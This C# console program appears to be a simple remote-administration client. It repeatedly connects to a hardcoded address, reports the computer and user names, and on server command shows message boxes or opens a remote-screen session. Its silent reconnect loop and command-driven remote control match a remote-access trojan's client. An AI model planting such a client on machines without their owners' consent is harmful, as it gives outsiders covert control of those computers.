using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Web.Script.Serialization;

namespace Client
{
    class Program
    {
        public static string ip = "192.168.102.82";
        public static int port = 777;

        static void Main(string[] args)
        {
            TcpClient client = new TcpClient();
            while (true)
            {
                try
                {
                    Thread.Sleep(3000);
                    client.Connect(IPAddress.Parse(ip), port);

                    Console.WriteLine("Соединение установленно");

                    NetworkStream stream = client.GetStream();
                    StreamWriter writer = new StreamWriter(stream);

                    string CompName = Environment.MachineName;
                    string UserName = Environment.UserName;

                    writer.WriteLine($"{CompName};{UserName}");
                    writer.Flush();

                    StreamReader reader = new StreamReader(stream);

                    JavaScriptSerializer serializer = new JavaScriptSerializer();

                    while (true)
                    {
                        string s = reader.ReadLine();
                        int id = serializer.Deserialize<Core.Commands.Command>(s).Id;
                        switch (id)
                        {
                            case 1:
                                {
                                    serializer.Deserialize<Core.Commands.ShowMessageBox>(s).Show();
                                }
                                break;
                            case 2:
                                {
                                    var b = serializer.Deserialize<Core.Commands.RDP.RemoteScreenCommand>(s);
                                    Core.Commands.RDP.Remote remote = new Core.Commands.RDP.Remote(b);
                                    writer.WriteLine(remote.ConnectionString());
                                    writer.Flush();
                                }
                                break;
                            case 3:
                                {
                                    reader.Close();
                                    writer.Close();
                                    client.Close();
                                    goto Close;
                                }
                                break;
                        }
                    }
                }
                catch { }
            }
            Close:;
        }
    }
}
